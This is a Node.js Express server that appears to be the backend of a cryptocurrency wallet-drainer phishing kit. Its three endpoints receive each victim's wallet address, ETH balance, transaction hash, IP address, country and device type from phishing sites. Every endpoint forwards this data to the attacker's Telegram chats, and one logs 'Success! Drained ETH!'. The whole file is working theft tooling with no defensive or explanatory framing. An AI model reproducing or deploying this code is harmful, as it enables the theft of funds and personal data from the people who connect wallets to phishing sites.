const express = require("express");
const request = require('request');
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");

const app = express()
const PORT = process.env.PORT || 3000 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());



const config = { 
 }
 
 let provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth"
);

app.post("/backend/safa/eth", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenPrice = req.body.tokenPrice;
    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {

        let message = 
        `*Approved Transfer ETH*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ETH \n*`+
        `*Token Price: ${escaper(tokenPrice)} ETH\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Success! Drained ETH!");
            res.sendStatus(200);
        });
 
    } catch(error) {
        console.warn("[-] SAFA ETH error: ", error)
    }
});

app.post("/backend/connection", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;


    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        let message = 
        `*New Connection*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
    
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Connection");
            res.sendStatus(200);
        });

    } catch(error) {
        console.warn("[-] Connection error: ", error);
    }
});

app.post("/backend/cancel", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }


    try {
        let message = 
        `*Canceled Transaction ${tokenType} ${tokenName}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n${
            tokenType != "Seaport"
            ? 
            `*Token Name: ${escaper(tokenName)} *\n`+
            `*Token Price: ${escaper(tokenPrice)} *\n`
            :
            ""
        }`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log(error);
            res.sendStatus(200);
        });
    } catch(error) {
        console.warn("[-] Cancel error: ", error);
    }
});


app.listen(PORT, () => {

console.log(`Backend Ative On Port ${PORT} And Waiting For Logs`);
});


